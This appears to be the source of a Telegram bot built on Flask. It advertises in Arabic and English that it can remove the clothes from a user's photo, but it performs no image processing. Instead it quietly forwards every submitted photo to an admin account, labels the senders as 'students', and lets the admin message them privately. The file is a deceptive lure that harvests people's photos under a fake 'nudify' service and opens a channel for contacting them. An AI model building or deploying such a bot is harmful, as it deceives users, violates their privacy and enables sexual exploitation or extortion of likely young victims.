from flask import Flask, request
import telebot
import os
from telebot import types

API_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)

user_photo_quota = {}
student_lookup = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id,
        "\U0001F440 تخيّل صورتك تتعدّل بثواني...\n"
        "\U0001F48B تقدر تشوفها بدون ملابس، أو بملامح أحلى.\n"
        "\U0001F4F8 أرسل صورة الآن وخلّنا نبدأ...\n\n"
        "\U0001F440 Imagine your photo transformed in seconds...\n"
        "\U0001F48B See it with no clothes, or with enhanced features.\n"
        "\U0001F4F8 Send a photo now... let’s get started.")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    uid = message.from_user.id
    quota = user_photo_quota.get(uid, 0)
    if quota >= 3:
        bot.send_message(message.chat.id, "\u26D4\uFE0F لقد استهلكت الحد الأقصى (3 صور اليوم). جرّب غدًا.")
        return

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("إزالة الملابس \U0001F51E", callback_data="nude"))
    markup.add(types.InlineKeyboardButton("تعديل الوجه \U0001F484", callback_data="face"))
    markup.add(types.InlineKeyboardButton("تحسين الصورة \U0001F4F8", callback_data="quality"))

    bot.send_message(message.chat.id, "اختر نوع التعديل المطلوب:", reply_markup=markup)

    try:
        file_id = message.photo[-1].file_id
        caption = f"\U0001F4E5 صورة جديدة من الطالب: {message.from_user.first_name}"
        sent = bot.send_photo(ADMIN_ID, file_id, caption=caption)
        student_lookup[sent.message_id] = message.chat.id
        user_photo_quota[uid] = quota + 1
    except Exception as e:
        print("خطأ بإرسال الصورة للمشرف:", e)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "nude":
        bot.send_message(call.message.chat.id, "\u2705 تم اختيار \"إزالة الملابس\"\nيرجى الانتظار...")
    elif call.data == "face":
        bot.send_message(call.message.chat.id, "\u2705 تم اختيار \"تعديل الوجه\"\nيرجى الانتظار...")
    elif call.data == "quality":
        bot.send_message(call.message.chat.id, "\u2705 تم اختيار \"تحسين الصورة\"\nيرجى الانتظار...")

@bot.message_handler(func=lambda m: m.chat.id == ADMIN_ID and m.reply_to_message)
def admin_reply(message):
    student_id = student_lookup.get(message.reply_to_message.message_id)
    if student_id:
        bot.send_message(student_id, f"\U0001F4E9 رسالة من المشرف:\n{message.text}")
        bot.send_message(ADMIN_ID, "\u2705 تم إرسال الرد.")
    else:
        bot.send_message(ADMIN_ID, "\u26A0\uFE0F لم يتم ربط هذه الرسالة بأي طالب.")

@bot.message_handler(commands=['رد'])
def manual_reply(message):
    if message.chat.id != ADMIN_ID:
        return
    parts = message.text.split(" ", 2)
    if len(parts) < 3:
        bot.send_message(ADMIN_ID, "/رد student_id الرسالة")
        return
    try:
        sid = int(parts[1])
        bot.send_message(sid, f"\U0001F4E9 رسالة من المشرف:\n{parts[2]}")
        bot.send_message(ADMIN_ID, "\u2705 تم الإرسال.")
    except:
        bot.send_message(ADMIN_ID, "\u274C خطأ أثناء الإرسال.")

@bot.message_handler(func=lambda msg: msg.content_type != 'photo')
def text_warning(message):
    bot.send_message(message.chat.id, "\u26A0\uFE0F هذا البوت يتعامل فقط مع الصور. أرسل صورة للمتابعة.")

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        bot.process_new_updates([telebot.types.Update.de_json(request.stream.read().decode("utf-8"))])
        return '', 200
    else:
        return 'Invalid content type', 403

@app.route('/')
def index():
    return 'OK'

if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url=WEBHOOK_URL)
    print("\u2705 Bot is running via Webhook")
    app.run(host="0.0.0.0", port=10000)
